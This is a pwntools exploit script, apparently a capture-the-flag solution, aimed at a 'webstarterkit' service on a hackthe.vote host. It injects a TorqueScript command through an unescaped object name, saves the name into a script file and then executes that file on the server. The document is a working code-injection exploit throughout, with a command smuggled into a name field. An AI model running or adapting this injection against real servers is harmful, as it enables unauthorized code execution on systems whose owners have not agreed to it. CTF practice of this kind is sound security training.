from pwn import *

if args.REMOTE:
	r = remote("webstarterkit.hackthe.vote", 28080)
else:
	r = remote("localhost", 28080)

cmd = "echo($flag);"

# torque doesn't escape names in save files
name = f"); {cmd} new SimObject("
savefile = f"starter.web/tmp/exploit.cs"

# (socket).setName(name)
# (socket).save(savefile)
# exec(savefile)

body = f"""CALL setName?1 HTTP/1.1
Content-Length: {len(name)}

{name}
CALL save?1 HTTP/1.1
Content-Length: {len(savefile)}

{savefile}
RUNSCRIPT {savefile} HTTP/1.1

""".replace("\n", "\r\n")

print(body)

r.send(body)
r.interactive()
